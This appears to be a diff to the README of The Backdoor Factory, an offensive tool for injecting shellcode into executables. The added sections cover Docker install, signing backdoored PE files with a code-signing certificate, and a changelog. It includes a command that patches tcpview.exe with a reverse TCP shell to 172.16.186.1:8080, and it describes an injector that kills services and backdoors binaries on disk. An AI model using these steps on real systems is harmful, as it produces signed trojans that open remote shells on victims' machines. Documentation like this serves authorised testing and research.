@@ -1,8 +1,19 @@
 
 ##The Backdoor Factory (BDF)
+
 For security professionals and researchers only.
 
+
+
 The goal of BDF is to patch executable binaries with user desired shellcode and continue normal execution of the prepatched state.
+
+[![Join the chat at https://gitter.im/secretsquirrel/the-backdoor-factory](https://badges.gitter.im/secretsquirrel/the-backdoor-factory.svg)](https://gitter.im/secretsquirrel/the-backdoor-factory?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)  [![Black Hat Arsenal](https://www.toolswatch.org/badges/arsenal/2015.svg)](https://www.blackhat.com/us-15/arsenal.html)
+
+Black Hat USA 2015:
+
+    Video: https://www.youtube.com/watch?v=OuyLzkG16Uk
+    
+    Paper: https://www.blackhat.com/docs/us-15/materials/us-15-Pitts-Repurposing-OnionDuke-A-Single-Case-Study-Around-Reusing-Nation-State-Malware-wp.pdf
 
 
 Shmoocon 2015:
@@ -40,8 +51,18 @@ Under a BSD 3 Clause License
 See the wiki: https://github.com/secretsquirrel/the-backdoor-factory/wiki
 
 ---
+## Installing
 
-###Dependences
+### DOCKER
+```
+docker pull secretsquirrel/the-backdoor-factory
+docker run -it secretsquirrel/the-backdoor-factory bash
+# ./backdoor.py
+```
+
+###OLD SCHOOL
+
+####Dependences
 #####*To use OnionDuke you MUST be on an intel machine because aPLib has no support for the ARM chipset yet.*
 
 
@@ -50,8 +71,12 @@ See the wiki: https://github.com/secretsquirrel/the-backdoor-factory/wiki
     sudo pip install capstone
 
 Pefile, most recent:
-https://code.google.com/p/pefile/
+    
+    https://code.google.com/p/pefile/
 
+osslsigncode (included in repo): 
+    
+    http://sourceforge.net/p/osslsigncode/osslsigncode/ci/master/tree/
 
 Kali Install:
 
@@ -212,7 +237,40 @@ Sample Usage:
     This will pop calc.exe on a target windows workstation. So 1337. Much pwn. Wow.
 
 ---
+###PEcodeSigning
 
+BDF can sign PE files if you have a codesigning cert. It uses osslsigncode.
+Put your signing cert and private key in the certs/ directory.  Prep your certs using openssl commands from this blog post:
+http://secureallthethings.blogspot.com/2015/12/add-pe-code-signing-to-backdoor-factory.html
+
+Put your private key password in a file (gasp) as so (exactly as so): 
+    
+    echo -n yourpassword > certs/passFile.txt
+
+Name your certs EXACTLY as follows:
+	
+    signingCert.cer => certs/signingCert.cer
+    signingPrivateKey.pem => certs/signingPrivateKey.pem
+
+Your certs/ directory should look excatly as so:
+    
+    certs
+    ├── passFile.txt
+    ├── signingPrivateKey.pem
+    └── signingCert.cer
+
+Enable PE Code Signing with the -C flag as so:
+
+     ./backdoor.py -f tcpview.exe -s iat_reverse_tcp_inline -H 172.16.186.1 -P 8080 -m automatic -C
+
+
+On successful run you should see this line in BDF output:
+
+    [*] Code Signing Succeeded
+
+
+
+---
 ###Hunt and backdoor: Injector | Windows Only
     The injector module will look for target executables to backdoor on disk.  It will check to see if you have identified the target as a service, check to see if the process is running, kill the process and/or service, inject the executable with the shellcode, save the original file to either file.exe.old or another suffix of choice, and attempt to restart the process or service.  
     Edit the python dictionary "list_of_targets" in the 'injector' module for targets of your choosing.
@@ -223,12 +281,51 @@ Sample Usage:
 
 ###Changelog
 
+####01/11/2016
+
+* Fix entry point truncation bug that led to improper recovery in rare instances
+
+
+####07/04/2016
+
+* Support for dynamic paths in BDFProxy for preprocessor
+
+####06/19/2016
+
+* Added the preprocessor and other optimizations
+* The preprocessor allows the user to modify the binary prior to payload injection
+* Invoke with the -p flag
+* See samples in ./preprocessor/
+
+
+####12/20/2015
+
+ * Added directory paths to BDF to find certs directory.
+
+
+####12/18/2015
+ * Added PE codesiging support.  You must provide your own codesigning cert. See here: https://github.com/secretsquirrel/the-backdoor-factory#pecodesigning
+
+####11/17/2015
+
+ * Bug fix in rsrc section for onionduke patching and remove of random win32 version value in PE Header
+
+####11/13/2015
+  * Added proper truncating of a PE file after signature pointer is cleared in PE header - e.g. proper unsigning.  Resulting in better support for IAT patching
+
+####10/19/2015
+  * Fixed bug in IAT directory cave assignment that caused BDF crash
+  * Made the feature optional with -A flag
+
+####10/13/2015
+   * Changed the Import Table Directory modifications from adding a new section to using an existing code cave
+
+
 ####08/12/2015
    * Added 'replace' PATCH_METHOD - a straight PE copy pasta of the supplied binary
    * More for usage with BDFProxy
 
         Usage: ./backdoor.py -f weee.exe -m replace -b supplied_binary.exe
-
 
 ####08/11/2015
    * Stability fix for auto cave selection for rare caves of overlap
@@ -358,10 +455,9 @@ Small optimizations for speed.
 Added a new win86 shellcode: loadliba_reverse_tcp
     
   - Based on the following research by Jared DeMott: http://bromiumlabs.files.wordpress.com/2014/02/bypassing-emet-4-1.pdf -- Thanks @bannedit0 for mentioning this.
-  - This shellcode uses LoadLibraryA and GetProcessAddress APIs to find all necessary APIs for a reverse TCP connection. No more of Stephen Fewers API hash lookup (which is still brilliant).
+  - This shellcode uses LoadLibraryA and GetProcAddress APIs to find all necessary APIs for a reverse TCP connection. No more of Stephen Fewers API hash lookup (which is still brilliant).
   - It's not stealthy. It's position dependent. But the results are great (code cave jumping): https://www.virustotal.com/en/file/a31ed901abcacd61a09a84157887fc4a189d3fe3e3573c24e776bac8d5bb8a0f/analysis/1401385796/
   - Bypasses EMET 4.1. The caller protection doesn't catch it.
   - As such, I'll be furthering this idea with an algo that patches the binary with custom shellcode based on the APIs that are in the IAT. Including porting the current win86 shellcodes to this idea.
 
 ---
-
